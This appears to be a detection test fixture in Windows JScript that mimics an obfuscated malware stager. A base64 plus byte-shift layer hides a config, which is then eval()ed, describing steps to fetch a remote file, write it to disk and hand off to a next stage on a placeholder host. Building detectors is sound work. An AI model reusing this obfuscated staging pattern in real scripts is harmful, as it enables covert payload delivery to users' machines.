// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_88e7942f = function decode_88e7942f_body(s) {
  var d = [];
  for (var i = 0; i < s.length; i++) { d.push((s[i] - 29 + 256) % 256); }
  return d;
};
var recover_cdc500ba = function recover_cdc500ba_body() {
  var packedText = "mD+QkYKNkD9XeD9+gI6Sho+CfI+CioyRgj9JP5SPhpGCfIOGiYI/ST+BhpCNfpGAhXyNj4yAgpCQP0k/hX6LgYyDg3yQgI+GjZE/ekk/foF+jZGCjz9XP2pwdWppT0t1amllcXFtS1NLTT9JP5N+iZKCkD9XmD+AfoqNfoaEi3yGgT9XP4B+io1+hoSLSlNPVVOCg3+BUE4/ST+Sj4k/Vz+FkZGNkFdMTFNPVVOCg3+BUE5LgpV+io2JgkuGi5N+iYaBTFBUg0+DVFBTS4F+kT9JP5KQgo98foSCi5E/Vz9lkouRj4KQkGl+f0xTT1VTgoN/gVBOP0k/g4aJgnyNfpGFP1c/YFd5eXKQgo+QeXltkn+JhoB5eWWSi5GPgpCQaX5/eXmQkX6EgkpTT1VTgoN/gVBOS4F+kT9JP4+ChIaQkY+WfI1+kYU/Vz9laGByeXlwjIORlH6Pgnl5ZZKLkY+CkJBpfn95eWGGkI2MkH5/iYJ5eVNPVVOCg3+BUE4/ST+LgpWRfJCRfoSCP1c/j4KQjJKPgIJKkH6KjYmCS42QTj+aST+QkX6EgmCMkouRP1dRmg==";
  var s = decodeBase64(packedText);

  var d = [];
  var pass = 0;
  while (pass < 1) { d = decode_88e7942f(s); pass++; }
  var textParts = [], bi = 0;
  for (bi = 0; bi < d.length; bi++) { textParts.push(String.fromCharCode(d[bi])); }
  var t = textParts.join("");
  return t;
};
var inspect_14a61c14 = function inspect_14a61c14_body() {
  var o = eval("(" + recover_cdc500ba() + ")");
  var p = new Object();
  p.steps = o.steps;
  p.adapter = o.adapter;
  p.values = o.values;
  p.stageCount = o.stageCount;
  return p;
};
